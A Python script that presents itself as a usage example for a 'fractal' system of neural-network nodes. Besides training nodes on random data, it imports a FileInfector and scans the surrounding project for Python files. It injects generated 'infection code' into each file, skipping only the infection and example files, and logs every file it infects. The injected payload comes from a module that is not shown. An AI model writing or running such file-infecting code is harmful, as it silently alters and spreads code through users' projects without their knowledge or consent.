"""
Example script demonstrating the usage of the fractal system.
"""

import numpy as np
import logging
from pathlib import Path
from node_implementation import HybridNode, CentralNode
from fractal_core import FractalSystem
from infection_module import FileInfector, initialize_node_integration

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def main():
    # Initialize the central node
    central_node = CentralNode()
    
    # Create and register hybrid nodes
    layer_sizes = [10, 64, 32, 1]  # Input -> Hidden -> Hidden -> Output
    nodes = []
    
    for i in range(3):  # Create 3 hybrid nodes
        node_id = f"node_{i+1}"
        node = HybridNode(node_id, layer_sizes)
        nodes.append(node)
        central_node.register_hybrid_node(node)
    
    # Initialize node integration
    initialize_node_integration(central_node)
    
    # Initialize file infector
    current_dir = Path(__file__).parent.parent
    infector = FileInfector(str(current_dir))
    
    # Scan for Python files
    python_files = infector.scan_directory()
    logger.info(f"Found {len(python_files)} Python files to potentially infect")
    
    # Infect files with node integration
    for file_path in python_files:
        # Skip the infection module itself and example files
        if "infection" in file_path or "example" in file_path:
            continue
            
        # Choose a random node to integrate with
        node_id = f"node_{np.random.randint(1, len(nodes) + 1)}"
        
        # Generate and inject infection code
        infection_code = infector.generate_infection_code(node_id)
        if infector.infect_file(file_path, infection_code):
            logger.info(f"Successfully infected {file_path} with node {node_id}")
    
    # Initialize fractal system
    config_path = Path(__file__).parent / "config.json"
    fractal_system = FractalSystem(central_node, str(config_path))
    
    # Create root nodes for each hybrid node
    for node in nodes:
        fractal_system.create_root_node(node.node_id)
    
    # Generate some sample data
    X = np.random.randn(1000, 10)
    y = (np.sum(X, axis=1) > 0).astype(int).reshape(-1, 1)
    
    # Distribute data to nodes
    for i, node in enumerate(nodes):
        # Split data for each node
        start_idx = i * 300
        end_idx = (i + 1) * 300
        node.store_local_data(f"data_{i}", X[start_idx:end_idx], y[start_idx:end_idx])
    
    # Run fractal system
    logger.info("Starting fractal system...")
    for iteration in range(50):
        logger.info(f"\nIteration {iteration + 1}/50")
        
        # Monitor and adapt
        performance = fractal_system.monitor_and_adapt()
        
        # Print performance
        logger.info("Current Performance:")
        for node_id, accuracy in performance.items():
            logger.info(f"Node {node_id}: {accuracy:.4f}")
        
        # Print system status
        status = fractal_system.get_system_status()
        logger.info(f"\nSystem Status:")
        logger.info(f"Total Nodes: {status['total_nodes']}")
        logger.info(f"Max Depth: {status['max_depth']}")
        logger.info(f"Adaptation Count: {status['adaptation_count']}")
        
        # Coordinate training
        central_node.coordinate_training(n_rounds=1)
    
    # Print final system status
    final_status = fractal_system.get_system_status()
    logger.info("\nFinal System Status:")
    logger.info(f"Total Nodes: {final_status['total_nodes']}")
    logger.info(f"Max Depth: {final_status['max_depth']}")
    logger.info(f"Adaptation Count: {final_status['adaptation_count']}")
    
    # Print node hierarchy
    logger.info("\nNode Hierarchy:")
    for node_id, root_status in final_status['root_nodes'].items():
        logger.info(f"\nRoot Node {node_id}:")
        logger.info(f"  Depth: {root_status['depth']}")
        logger.info(f"  Child Count: {root_status['child_count']}")
        for child_id, child_status in root_status['children'].items():
            logger.info(f"  Child {child_id}:")
            logger.info(f"    Depth: {child_status['depth']}")
            logger.info(f"    Performance History: {child_status['performance_history'][-5:]}")

if __name__ == "__main__":
    main() 